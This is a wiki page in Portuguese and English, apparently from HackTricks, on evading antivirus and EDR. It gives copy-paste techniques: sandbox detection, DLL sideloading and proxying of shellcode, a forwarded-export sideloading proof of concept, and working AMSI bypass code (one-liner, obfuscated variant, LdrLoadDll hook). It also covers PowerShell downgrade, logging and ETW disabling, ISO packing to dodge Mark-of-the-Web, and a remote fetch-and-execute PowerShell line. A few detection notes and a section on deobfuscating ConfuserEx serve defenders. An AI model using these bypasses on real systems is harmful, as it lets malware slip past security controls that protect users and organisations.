# Evasão de Antivírus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Esta página foi escrita por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Parar o Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uma ferramenta para impedir o funcionamento do Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Uma ferramenta para impedir o funcionamento do Windows Defender fingindo outro AV.
- [Desabilitar o Defender se você for admin](basic-powershell-for-pentesters/README.md)

## **Metodologia de Evasão de AV**

Atualmente, os AVs usam diferentes métodos para verificar se um arquivo é malicioso ou não: detecção estática, análise dinâmica e, para os EDRs mais avançados, análise comportamental.

### **Detecção estática**

A detecção estática é feita sinalizando strings conhecidas ou arrays de bytes em um binário ou script, e também extraindo informações do próprio arquivo (ex.: file description, company name, digital signatures, icon, checksum, etc.). Isso significa que usar ferramentas públicas conhecidas pode fazer você ser detectado com mais facilidade, já que provavelmente foram analisadas e marcadas como maliciosas. Existem algumas maneiras de contornar esse tipo de detecção:

- **Encryption**

Se você criptografar o binário, não haverá como o AV detectar seu programa, mas você precisará de algum loader para descriptografar e executar o programa em memória.

- **Obfuscation**

Às vezes tudo o que você precisa fazer é alterar algumas strings no seu binário ou script para passar pelo AV, mas isso pode ser uma tarefa demorada dependendo do que você está tentando ofuscar.

- **Custom tooling**

Se você desenvolver suas próprias ferramentas, não haverá assinaturas conhecidas como ruins, mas isso exige muito tempo e esforço.

> [!TIP]
> Uma boa forma de checar a detecção estática do Windows Defender é [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ele basicamente divide o arquivo em vários segmentos e pede ao Defender para escanear cada um individualmente; dessa forma, ele consegue dizer exatamente quais strings ou bytes são sinalizados no seu binário.

Recomendo fortemente que confira esta [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre AV Evasion na prática.

### **Análise dinâmica**

A análise dinâmica é quando o AV executa seu binário em uma sandbox e observa atividades maliciosas (ex.: tentar descriptografar e ler as senhas do seu browser, realizar um minidump no LSASS, etc.). Essa parte pode ser mais complicada de lidar, mas aqui estão algumas coisas que você pode fazer para evadir sandboxes.

- **Dormir antes da execução** Dependendo de como está implementado, pode ser uma ótima forma de contornar a análise dinâmica do AV. Os AVs têm um tempo muito curto para escanear arquivos para não interromper o fluxo do usuário, então usar sleeps longos pode prejudicar a análise dos binários. O problema é que muitas sandboxes dos AVs podem simplesmente pular o sleep dependendo de como está implementado.
- **Verificando recursos da máquina** Geralmente sandboxes têm muito poucos recursos disponíveis (ex.: < 2GB RAM), caso contrário poderiam degradar a máquina do usuário. Você também pode ser criativo aqui, por exemplo checando a temperatura da CPU ou até as rotações das ventoinhas; nem tudo será implementado na sandbox.
- **Verificações específicas da máquina** Se você quer direcionar um usuário cuja workstation está ingressada no domínio "contoso.local", você pode checar o domínio do computador para ver se corresponde ao especificado; se não corresponder, seu programa pode simplesmente sair.

Acontece que o nome do computador da Sandbox do Microsoft Defender é HAL9TH, então você pode checar o nome do computador no seu malware antes da execução; se o nome coincidir com HAL9TH, significa que você está dentro da sandbox do Defender, então você pode fazer seu programa sair.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algumas outras dicas muito boas do [@mgeeky](https://twitter.com/mariuszbit) para lidar com Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Como dissemos antes neste post, **ferramentas públicas** eventualmente serão **detectadas**, então você deve se perguntar algo:

Por exemplo, se você quer fazer dump do LSASS, **você realmente precisa usar o mimikatz**? Ou você poderia usar outro projeto menos conhecido que também faz dump do LSASS.

A resposta certa provavelmente é a segunda. Tomando o mimikatz como exemplo, ele provavelmente é um dos, se não o mais, peça de malware sinalizada pelos AVs e EDRs; apesar do projeto ser muito bom, ele também é um pesadelo para contornar AVs, então procure alternativas para o que você está tentando alcançar.

> [!TIP]
> Ao modificar seus payloads para evasão, certifique-se de **desativar o envio automático de amostras** no Defender e, por favor, sério, **NÃO FAÇA UPLOAD NO VIRUSTOTAL** se seu objetivo é obter evasão a longo prazo. Se você quer checar se seu payload é detectado por um AV em particular, instale-o em uma VM, tente desligar o envio automático de amostras e teste lá até ficar satisfeito com o resultado.

## EXEs vs DLLs

Sempre que possível, **priorize usar DLLs para evasão**; na minha experiência, arquivos DLL geralmente são **muito menos detectados** e analisados, então é um truque simples para evitar detecção em alguns casos (se o seu payload tiver alguma forma de rodar como DLL, claro).

Como podemos ver nesta imagem, um Payload DLL do Havoc tem uma taxa de detecção de 4/26 no antiscan.me, enquanto o payload EXE tem 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparação no antiscan.me de um payload Havoc EXE normal vs um Havoc DLL normal</p></figcaption></figure>

Agora vamos mostrar alguns truques que você pode usar com arquivos DLL para ser muito mais furtivo.

## DLL Sideloading & Proxying

**DLL Sideloading** aproveita a ordem de busca de DLLs usada pelo loader posicionando tanto a aplicação vítima quanto o(s) payload(s) malicioso(s) lado a lado.

Você pode checar programas suscetíveis a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e o seguinte script do powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando exibirá a lista de programas suscetíveis a DLL hijacking dentro de "C:\Program Files\\" e os arquivos DLL que eles tentam carregar.

Recomendo fortemente que você **explore DLL Hijackable/Sideloadable programs por conta própria**, esta técnica é bastante furtiva quando feita corretamente, mas se você usar DLL Sideloadable programs publicamente conhecidos, pode ser facilmente detectado.

Apenas colocar uma DLL maliciosa com o nome que um programa espera carregar não fará com que seu payload seja executado, pois o programa espera funções específicas dentro dessa DLL; para resolver esse problema, usaremos outra técnica chamada **DLL Proxying/Forwarding**.

**DLL Proxying** encaminha as chamadas que um programa faz da DLL proxy (e maliciosa) para a DLL original, preservando assim a funcionalidade do programa e possibilitando tratar a execução do seu payload.

Vou usar o projeto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estes são os passos que segui:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
O último comando nos dará 2 arquivos: um template de código-fonte de DLL e a DLL original renomeada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nosso shellcode (codificado com [SGN](https://github.com/EgeBalci/sgn)) quanto o proxy DLL apresentam uma taxa de detecção de 0/26 em [antiscan.me](https://antiscan.me)! Eu chamaria isso de sucesso.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Eu **recomendo fortemente** que você assista [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading e também o [vídeo do ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender mais sobre o que discutimos, de forma mais aprofundada.

### Abusando de Forwarded Exports (ForwardSideLoading)

Módulos Windows PE podem exportar funções que são, na verdade, "forwarders": em vez de apontar para código, a entrada de export contém uma string ASCII da forma `TargetDll.TargetFunc`. Quando um chamador resolve o export, o Windows loader irá:

- Carregar `TargetDll` se ainda não estiver carregado
- Resolver `TargetFunc` a partir dele

Comportamentos-chave a entender:
- Se `TargetDll` for um KnownDLL, ele é fornecido a partir do namespace protegido KnownDLLs (por exemplo, ntdll, kernelbase, ole32).
- Se `TargetDll` não for um KnownDLL, a ordem normal de busca de DLLs é usada, a qual inclui o diretório do módulo que está realizando a resolução do forward.

Isso permite uma primitiva de sideloading indireta: encontre um DLL assinado que exporte uma função encaminhada para um nome de módulo que não seja KnownDLL; então coloque esse DLL assinado junto com um DLL controlado pelo atacante nomeado exatamente como o módulo de destino encaminhado. Quando o export encaminhado for invocado, o loader resolve o forward e carrega sua DLL do mesmo diretório, executando seu DllMain.

Exemplo observado no Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` não é uma KnownDLL, então é resolvida pela ordem normal de pesquisa.

PoC (copy-paste):
1) Copie a DLL do sistema assinada para uma pasta com permissão de escrita
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloque um `NCRYPTPROV.dll` malicioso na mesma pasta. Um `DllMain` mínimo é suficiente para obter execução de código; você não precisa implementar a função encaminhada para acionar o `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Acione o encaminhamento com um LOLBin assinado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento observado:
- rundll32 (assinada) carrega a side-by-side `keyiso.dll` (assinada)
- Ao resolver `KeyIsoSetAuditingInterface`, o loader segue o forward para `NCRYPTPROV.SetAuditingInterface`
- Em seguida o loader carrega `NCRYPTPROV.dll` de `C:\test` e executa seu `DllMain`
- Se `SetAuditingInterface` não estiver implementado, você receberá um erro "missing API" apenas depois que `DllMain` já tiver sido executado

Dicas de detecção:
- Concentre-se em forwarded exports onde o módulo de destino não é um KnownDLL. KnownDLLs estão listados em `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Você pode enumerar forwarded exports com ferramentas como:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Veja o inventário de forwarders do Windows 11 para procurar candidatos: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitorar LOLBins (por exemplo, `rundll32.exe`) carregando DLLs assinadas de caminhos fora do diretório do sistema, seguido pelo carregamento de non-KnownDLLs com o mesmo nome-base desse diretório
- Alertar sobre cadeias processo/módulo como: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` em caminhos graváveis pelo usuário
- Aplicar políticas de integridade de código (WDAC/AppLocker) e negar write+execute em diretórios de aplicações

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Você pode usar Freeze para carregar e executar seu shellcode de forma furtiva.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evitação é um jogo de gato e rato; o que funciona hoje pode ser detectado amanhã, então nunca confie em apenas uma ferramenta — se possível, tente encadear múltiplas técnicas de evasão.

## AMSI (Anti-Malware Scan Interface)

AMSI was created to prevent "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Initially, AVs were only capable of scanning **files on disk**, so if you could somehow execute payloads **directly in-memory**, the AV couldn't do anything to prevent it, as it didn't have enough visibility.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

It allows antivirus solutions to inspect script behavior by exposing script contents in a form that is both unencrypted and unobfuscated.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Perceba como ele antepõe `amsi:` e então o caminho para o executável de onde o script foi executado, neste caso, powershell.exe

Não gravamos nenhum arquivo no disco, mas ainda assim fomos pegos na memória por causa do AMSI.

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

There are a couple of ways to get around AMSI:

- **Obfuscation**

Since AMSI mainly works with static detections, therefore, modifying the scripts you try to load can be a good way for evading detection.

However, AMSI has the capability of unobfuscating scripts even if it has multiple layers, so obfuscation could be a bad option depending on how it's done. This makes it not-so-straightforward to evade. Although, sometimes, all you need to do is change a couple of variable names and you'll be good, so it depends on how much something has been flagged.

- **AMSI Bypass**

Since AMSI is implemented by loading a DLL into the powershell (also cscript.exe, wscript.exe, etc.) process, it's possible to tamper with it easily even running as an unprivileged user. Due to this flaw in the implementation of AMSI, researchers have found multiple ways to evade AMSI scanning.

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Tudo o que foi preciso foi uma linha de código powershell para tornar AMSI inutilizável para o processo powershell atual. Esta linha foi, claro, sinalizada pela própria AMSI, então alguma modificação é necessária para usar esta técnica.

Aqui está um AMSI bypass modificado que peguei deste [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Essa técnica foi inicialmente descoberta por [@RastaMouse](https://twitter.com/_RastaMouse/) e envolve encontrar o endereço da função "AmsiScanBuffer" em amsi.dll (responsável por escanear a entrada fornecida pelo usuário) e sobrescrevê‑la com instruções para retornar o código E_INVALIDARG; assim, o resultado do scan real retornará 0, que é interpretado como um resultado limpo.

> [!TIP]
> Leia [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para uma explicação mais detalhada.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Bloqueando AMSI impedindo o carregamento de amsi.dll (LdrLoadDll hook)

O AMSI é inicializado apenas depois que `amsi.dll` é carregado no processo atual. Um bypass robusto e agnóstico à linguagem é colocar um user‑mode hook em `ntdll!LdrLoadDll` que retorna um erro quando o módulo solicitado é `amsi.dll`. Como resultado, o AMSI nunca é carregado e nenhum scan ocorre para esse processo.

Esboço de implementação (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Funciona com PowerShell, WScript/CScript e loaders customizados (qualquer coisa que carregaria AMSI).
- Combine com o envio de scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar artefatos longos na linha de comando.
- Visto sendo usado por loaders executados através de LOLBins (por exemplo, `regsvr32` chamando `DllRegisterServer`).

Esta ferramenta [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) também gera script para bypass do AMSI.

**Remover a assinatura detectada**

Você pode usar uma ferramenta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para remover a assinatura AMSI detectada da memória do processo atual. Essa ferramenta funciona escaneando a memória do processo atual em busca da assinatura AMSI e então sobrescrevendo-a com instruções NOP, removendo-a efetivamente da memória.

**Produtos AV/EDR que usam AMSI**

Você pode encontrar uma lista de produtos AV/EDR que usam AMSI em **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use PowerShell versão 2**
Se você usar PowerShell versão 2, AMSI não será carregado, então você pode executar seus scripts sem serem escaneados pelo AMSI. Você pode fazer isso:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging é um recurso que permite registrar todos os comandos PowerShell executados em um sistema. Isso pode ser útil para auditoria e resolução de problemas, mas também pode ser um **problema para atacantes que querem evadir a detecção**.

Para contornar o PowerShell logging, você pode usar as seguintes técnicas:

- **Disable PowerShell Transcription and Module Logging**: Você pode usar uma ferramenta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para esse fim.
- **Use Powershell version 2**: Se você usar PowerShell versão 2, AMSI não será carregado, então você pode executar seus scripts sem serem escaneados pelo AMSI. Você pode fazer isso: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Use [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para iniciar uma sessão PowerShell sem defesas (isto é o que `powerpick` do Cobal Strike usa).


## Ofuscação

> [!TIP]
> Várias técnicas de obfuscação dependem de criptografar dados, o que aumenta a entropia do binário e facilita que AVs e EDRs o detectem. Tenha cuidado com isso e talvez aplique criptografia apenas a seções específicas do seu código que sejam sensíveis ou que precisem ficar ocultas.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Ao analisar malware que usa ConfuserEx 2 (ou forks comerciais) é comum enfrentar várias camadas de proteção que bloqueiam decompiladores e sandboxes. O fluxo de trabalho abaixo restaura de forma confiável um IL quase original que pode depois ser decompilado para C# em ferramentas como dnSpy ou ILSpy.

1.  Anti-tampering removal – ConfuserEx criptografa cada *method body* e descriptografa dentro do construtor estático do *module* (`<Module>.cctor`). Isso também altera o checksum do PE, então qualquer modificação fará o binário travar. Use **AntiTamperKiller** para localizar as tabelas de metadados criptografadas, recuperar as chaves XOR e reescrever um assembly limpo:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
A saída contém os 6 parâmetros anti-tamper (`key0-key3`, `nameHash`, `internKey`) que podem ser úteis ao construir seu próprio unpacker.

2.  Symbol / control-flow recovery – alimente o arquivo *clean* para **de4dot-cex** (um fork do de4dot com suporte a ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – seleciona o perfil ConfuserEx 2  
• o de4dot desfará o control-flow flattening, restaurará namespaces, classes e nomes de variáveis originais e descriptografará strings constantes.

3.  Proxy-call stripping – ConfuserEx substitui chamadas diretas de métodos por wrappers leves (a.k.a *proxy calls*) para dificultar ainda mais a decompilação. Remova-os com **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Após este passo você deverá observar APIs .NET normais como `Convert.FromBase64String` ou `AES.Create()` em vez de funções wrapper opacas (`Class8.smethod_10`, …).

4.  Manual clean-up – execute o binário resultante no dnSpy, procure por grandes blobs Base64 ou uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar o *real* payload. Frequentemente o malware o armazena como um array de bytes codificado em TLV inicializado dentro de `<Module>.byte_0`.

A cadeia acima restaura o fluxo de execução **sem** a necessidade de executar a amostra maliciosa – útil quando se trabalha em uma estação offline.

> 🛈  ConfuserEx produz um atributo customizado chamado `ConfusedByAttribute` que pode ser usado como um IOC para triagem automática de amostras.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): O objetivo deste projeto é fornecer um fork open-source da suíte de compilação [LLVM](http://www.llvm.org/) capaz de aumentar a segurança do software através de [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstra como usar `C++11/14` para gerar, em tempo de compilação, código ofuscado sem usar ferramentas externas e sem modificar o compilador.
- [**obfy**](https://github.com/fritzone/obfy): Adiciona uma camada de operações ofuscadas geradas pelo framework de metaprogramação de templates C++, o que tornará a vida de quem tenta quebrar a aplicação um pouco mais difícil.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz é um obfuscator de binários x64 capaz de ofuscar vários tipos de PE files, incluindo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame é um motor simples de código metamórfico para executáveis arbitrários.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator é um framework de ofuscação de código de granularidade fina para linguagens suportadas pelo LLVM usando ROP (return-oriented programming). ROPfuscator ofusca um programa ao nível de código assembly transformando instruções regulares em cadeias ROP, frustrando a nossa concepção natural de fluxo de controle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt é um .NET PE Crypter escrito em Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor é capaz de converter EXE/DLL existentes em shellcode e então carregá-los

## SmartScreen & MoTW

Você pode ter visto esta tela ao baixar alguns executáveis da internet e executá-los.

Microsoft Defender SmartScreen é um mecanismo de segurança destinado a proteger o usuário final contra a execução de aplicações potencialmente maliciosas.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funciona principalmente com uma abordagem baseada em reputação, o que significa que aplicações pouco baixadas irão acionar o SmartScreen, alertando e impedindo o usuário final de executar o arquivo (embora o arquivo ainda possa ser executado clicando em More Info -> Run anyway).

**MoTW** (Mark of The Web) é um [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) com o nome Zone.Identifier que é criado automaticamente ao baixar arquivos da internet, junto com a URL de onde foi baixado.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verificando o ADS Zone.Identifier para um arquivo baixado da internet.</p></figcaption></figure>

> [!TIP]
> É importante notar que executáveis assinados com um certificado de assinatura **trusted** **não irão acionar o SmartScreen**.

Uma forma muito eficaz de evitar que seus payloads recebam o Mark of The Web é empacotá-los dentro de algum tipo de container como um ISO. Isso acontece porque Mark-of-the-Web (MOTW) **não pode** ser aplicado a volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) é uma ferramenta que empacota payloads em containers de saída para evadir o Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) é um poderoso mecanismo de logging no Windows que permite que aplicações e componentes do sistema **registrem eventos**. No entanto, também pode ser usado por produtos de segurança para monitorar e detectar atividades maliciosas.

De forma similar a como o AMSI é desativado (bypassed), também é possível fazer com que a função **`EtwEventWrite`** do processo em espaço de usuário retorne imediatamente sem registrar quaisquer eventos. Isso é feito patchando a função na memória para retornar imediatamente, efetivamente desativando o registro do ETW para esse processo.

Você pode encontrar mais informações em **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Carregar binários C# na memória é conhecido há bastante tempo e ainda é uma ótima forma de executar suas ferramentas de post-exploitation sem ser detectado pelo AV.

Como o payload será carregado diretamente na memória sem tocar no disco, só teremos de nos preocupar em patchar o AMSI em todo o processo.

A maioria dos frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) já fornecem a capacidade de executar assemblies C# diretamente na memória, mas existem diferentes formas de fazê-lo:

- **Fork\&Run**

Envolve **criar um novo processo sacrificial**, injetar seu código malicioso de post-exploitation nesse novo processo, executar seu código malicioso e, quando terminar, matar o novo processo. Isso tem tanto benefícios quanto desvantagens. O benefício do método fork and run é que a execução ocorre **fora** do nosso Beacon implantado process. Isso significa que se algo nas nossas ações de post-exploitation der errado ou for detectado, há uma **chance muito maior** de nosso **implant sobreviver.** A desvantagem é que você tem uma **chance maior** de ser pego por **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Trata-se de injetar o código malicioso de post-exploitation **no seu próprio processo**. Dessa forma, você evita ter que criar um novo processo e fazê-lo ser escaneado pelo AV, mas a desvantagem é que se algo der errado com a execução do seu payload, há uma **chance muito maior** de **perder seu beacon** pois ele pode travar.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se quiser ler mais sobre carregamento de Assembly C#, confira este artigo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e o InlineExecute-Assembly BOF deles ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Você também pode carregar C# Assemblies **from PowerShell**, confira [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e o vídeo do S3cur3th1sSh1t ([https://www.youtube.com/watch?v=oe11Q-3Akuk](https://www.youtube.com/watch?v=oe11Q-3Akuk)).

## Using Other Programming Languages

Como proposto em [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), é possível executar código malicioso usando outras linguagens dando à máquina comprometida acesso **ao interpreter environment instalado no Attacker Controlled SMB share**.

Ao permitir acesso aos Interpreter Binaries e ao ambiente no compartilhamento SMB, você pode **executar código arbitrário nessas linguagens na memória** da máquina comprometida.

O repo indica: Defender ainda escaneia os scripts, mas ao utilizar Go, Java, PHP etc temos **mais flexibilidade para contornar assinaturas estáticas**. Testes com reverse shells aleatórios não ofuscados nessas linguagens mostraram-se bem-sucedidos.

## TokenStomping

Token stomping é uma técnica que permite a um atacante **manipular o access token ou um security product como um EDR ou AV**, permitindo reduzir seus privilégios de modo que o processo não morra, mas não tenha permissões para verificar atividades maliciosas.

Para prevenir isso, o Windows poderia **impedir que processos externos** obtenham handles sobre os tokens de processos de segurança.

